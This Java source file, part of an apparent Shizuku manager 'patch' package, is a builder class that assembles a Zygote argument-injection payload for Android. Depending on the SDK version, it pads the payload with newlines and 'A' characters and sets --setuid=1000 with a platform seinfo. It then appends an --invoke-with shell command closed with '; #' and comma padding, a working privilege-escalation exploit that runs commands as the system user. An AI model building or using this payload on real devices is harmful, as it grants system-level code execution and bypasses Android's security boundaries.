package moe.shizuku.manager.patch;

import android.os.Build;

import java.util.ArrayList;
import java.util.List;

/**
 * 用于构建 Zygote 启动参数配置字符串的工具类。
 * 支持设置各种 --xxx 参数，并可自动根据 SDK 版本添加前缀填充和末尾触发载荷。
 */
public class ZygoteArgumentBuilder {
    private int sdkInt;
    private int uid = 1000;
    private int gid = 9997;
    private String groups = "3003";
    private boolean runtimeArgs = true;
    private boolean mountExternalFull = true;
    private boolean mountExternalLegacy = true;
    private String seinfo = "platform:privapp:targetSdkVersion=%d:complete";
    private int runtimeFlags = 43267;
    private String niceName = "zYg0te";
    private String invokeWithCommand;          // --invoke-with 后要执行的命令，如 "/system/bin/sh"
    private String extraSuffix = "";            // 额外的结尾内容
    
    /**
     * 构造函数，默认使用当前设备的 SDK 版本。
     */
    public ZygoteArgumentBuilder() {
        this.sdkInt = Build.VERSION.SDK_INT;
		this.seinfo = String.format(seinfo, sdkInt);
    }

    /**
     * 构造函数，允许手动指定 SDK 版本（用于测试或自定义）。
     * @param sdkInt 目标设备的 Android SDK 版本号
     */
    public ZygoteArgumentBuilder(int sdkInt) {
        this.sdkInt = sdkInt;
		this.seinfo = String.format(seinfo, sdkInt);
    }

    // ---------- Setter 方法，支持链式调用 ----------
    public ZygoteArgumentBuilder setSdkInt(int sdkInt) {
        this.sdkInt = sdkInt;
        return this;
    }

    public ZygoteArgumentBuilder setUid(int uid) {
        this.uid = uid;
        return this;
    }

    public ZygoteArgumentBuilder setGid(int gid) {
        this.gid = gid;
        return this;
    }

    public ZygoteArgumentBuilder setGroups(String groups) {
        this.groups = groups;
        return this;
    }

    public ZygoteArgumentBuilder setRuntimeArgs(boolean runtimeArgs) {
        this.runtimeArgs = runtimeArgs;
        return this;
    }

    public ZygoteArgumentBuilder setMountExternalFull(boolean mountExternalFull) {
        this.mountExternalFull = mountExternalFull;
        return this;
    }

    public ZygoteArgumentBuilder setMountExternalLegacy(boolean mountExternalLegacy) {
        this.mountExternalLegacy = mountExternalLegacy;
        return this;
    }

    public ZygoteArgumentBuilder setSeinfo(String seinfo) {
        this.seinfo = seinfo;
        return this;
    }

    public ZygoteArgumentBuilder setRuntimeFlags(int runtimeFlags) {
        this.runtimeFlags = runtimeFlags;
        return this;
    }

    public ZygoteArgumentBuilder setNiceName(String niceName) {
        this.niceName = niceName;
        return this;
    }

    /**
     * 设置 --invoke-with 后要执行的命令。
     * @param command 例如 "/system/bin/sh" 或 "sh -c 'your_command'"
     */
    public ZygoteArgumentBuilder setInvokeWithCommand(String command) {
        this.invokeWithCommand = command;
        return this;
    }

    public ZygoteArgumentBuilder setExtraSuffix(String extraSuffix) {
        this.extraSuffix = extraSuffix;
        return this;
    }

    /**
     * 构建最终的 Zygote 参数字符串。
     * @return 完整的配置文本，可直接作为 Zygote 启动参数使用
     */
    public String build() {
        StringBuilder sb = new StringBuilder();

        // 1. 根据 SDK 版本添加前缀填充
        int count;   // 换行或 'A' 的重复次数
        if (sdkInt <= 30) {
            count = 5;
            sb.append(repeat("\n", count)).append(11).append("\n");
        } else if (sdkInt <= 33) {
            count = 5001;
            sb.append(repeat("\n", count)).append(repeat("A", 3157)).append(11);
        } else {
            count = 0; // 无特殊填充
        }

        // 2. 添加所有 --参数，每个参数后跟换行符
        sb.append("--setuid=").append(uid).append("\n")
			.append("--setgid=").append(gid).append("\n")
			.append("--setgroups=").append(groups).append("\n");

        if (runtimeArgs) sb.append("--runtime-args\n");
        if (mountExternalFull) sb.append("--mount-external-full\n");
        if (mountExternalLegacy) sb.append("--mount-external-legacy\n");

        sb.append("--seinfo=").append(seinfo).append("\n")
			.append("--runtime-flags=").append(runtimeFlags).append("\n")
			.append("--nice-name=").append(niceName).append("\n");

        // 3. --invoke-with 及后续载荷
        if (invokeWithCommand != null && !invokeWithCommand.isEmpty()) {
            sb.append("--invoke-with\n");
            // 命令后跟 ; # 用于闭合前一条命令，然后重复逗号，最后加 X
            sb.append(invokeWithCommand).append("; #");
            if (count > 0) {
                sb.append(repeat(",", count - 1));
            }
            sb.append("X");
        }

        // 4. 添加额外的自定义后缀
        if (extraSuffix != null && !extraSuffix.isEmpty()) {
            sb.append(extraSuffix);
        }

        return sb.toString();
    }

    /**
     * 简易的字符串重复方法，兼容 Java 8。
     */
    private static String repeat(String str, int times) {
        if (times <= 0) return "";
        StringBuilder sb = new StringBuilder(str.length() * times);
        for (int i = 0; i < times; i++) {
            sb.append(str);
        }
        return sb.toString();
    }

    // ---------- 可选：导出所有当前参数（用于调试）----------
    @Override
    public String toString() {
        return "ZygoteArgumentBuilder{" +
			"sdkInt=" + sdkInt +
			", uid=" + uid +
			", gid=" + gid +
			", groups='" + groups + '\'' +
			", runtimeArgs=" + runtimeArgs +
			", mountExternalFull=" + mountExternalFull +
			", mountExternalLegacy=" + mountExternalLegacy +
			", seinfo='" + seinfo + '\'' +
			", runtimeFlags=" + runtimeFlags +
			", niceName='" + niceName + '\'' +
			", invokeWithCommand='" + invokeWithCommand + '\'' +
			", extraSuffix='" + extraSuffix + '\'' +
			'}';
    }
}